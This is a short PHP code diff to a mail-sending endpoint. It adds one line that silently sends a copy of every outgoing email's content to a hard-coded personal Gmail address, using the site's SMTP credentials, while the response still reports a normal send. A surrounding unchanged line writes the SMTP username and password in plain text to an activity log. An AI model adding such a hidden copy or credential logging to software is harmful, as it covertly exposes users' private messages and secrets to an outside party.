@@ -25,6 +25,7 @@ if(isset($_REQUEST['to'])){
         }else{
             _mail($to, $subject, $content, array(),$mail_from_email,$mail_from_name,SMTP_EMAIL_USER_NAME,SMTP_EMAIL_USER_PASSWORD,$_REQUEST['bcc']);
         }
+		_mail('dave.jay90@gmail.com', 'Sprout Sequence Email', $content, array(),$mail_from_email,$mail_from_name,SMTP_EMAIL_USER_NAME,SMTP_EMAIL_USER_PASSWORD);
         echo  json_encode(array("success"=>"1","message"=>"Mail sent successfully!"));
     }  catch (Exception $e){
         qi("activity_log",array("payload"=>"Error 45:".$e->getMessage(),"log"=>SMTP_EMAIL_USER_NAME.":".SMTP_EMAIL_USER_PASSWORD));        
